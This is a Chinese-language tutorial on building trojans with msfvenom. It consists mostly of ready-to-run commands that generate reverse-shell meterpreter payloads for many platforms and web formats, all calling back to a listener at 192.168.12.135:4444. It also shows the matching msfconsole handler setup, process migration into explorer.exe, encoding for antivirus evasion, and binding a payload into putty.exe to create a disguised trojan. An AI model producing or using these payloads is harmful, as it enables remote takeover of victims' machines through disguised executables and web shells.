# Msfvenmon木马制作

**0x00 前言**

msfpayload是MSF攻击荷载生成器，用于生成shellcode和payload。

**0x01 常用参数介绍**

```
–p	--payload			添加载荷payload		
	--payload-options 	列出payload选项

–l	--list				查看所有payload encoder nops。

–f	--format			输出文件格式。		
	--help-formats 		列出所有文件格式

–e	--encoder			编码免杀。

–a	--arch				选择架构平台
	-–platform         	指定payload的目标平台
	
–o	--out				文件输出。

–s	--space				生成payload的最大长度，就是文件大小。

–b	--bad-chars			避免使用的字符 例如：不使用 ‘\0f’。

–i	--iterations		编码次数。

–c	--add-code			添加自己的shellcode。

-x	--template			指定一个自定义的可执行文件作为模板

-k	--keep				保护模板程序的动作，注入的payload作为一个新的进程运行
```



**0x02 操作流程**

1、生成木马，在靶机上运行

```shell
# 这里>写成-o也行
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f exe > shell.exe
```

2、在msfconsole进行监听

```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp   # 与生成木马所使用的payload对应上就行
show options
set lhost 192.168.12.135
set lport 4444
run
```

3、在靶机上运行木马

> 运行后攻击者就可以获取到反弹shell



**0x02 其他生成方式**

1、进程注入

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 prependmigrateprocess=explorer.exe prependmigrate=true -f exe > shell.exe
```

2、程序捆绑

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 -a x86 --platform windows -x putty.exe -k -f exe -o myputty.exe
```

3、Linux

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 -a x86 --platform linux -f elf > shell.elf
```

4、windows

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f exe > shell.exe
```

5、Mac

```shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f macho > shell.macho
```

6、Perl

```shell
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.12.135 LPORT=4444 -f raw > shell.pl
```

7、Lua

```shell
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.12.135 LPORT=4444 -f raw -o shell.lua
```

8、Ruby

```shell
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f raw -o shell.rb
```

9、PHP

```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f raw > shell.php
```

10、aspx

```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f aspx -o shell.aspx
```

11、asp

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f asp > shell.asp
```

12、jsp

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f raw > shell.jsp
```

13、war

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f war > shell.war
```

14、nodjs

```shell
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.12.135 LPORT=4444 -f raw -o shell.js
```


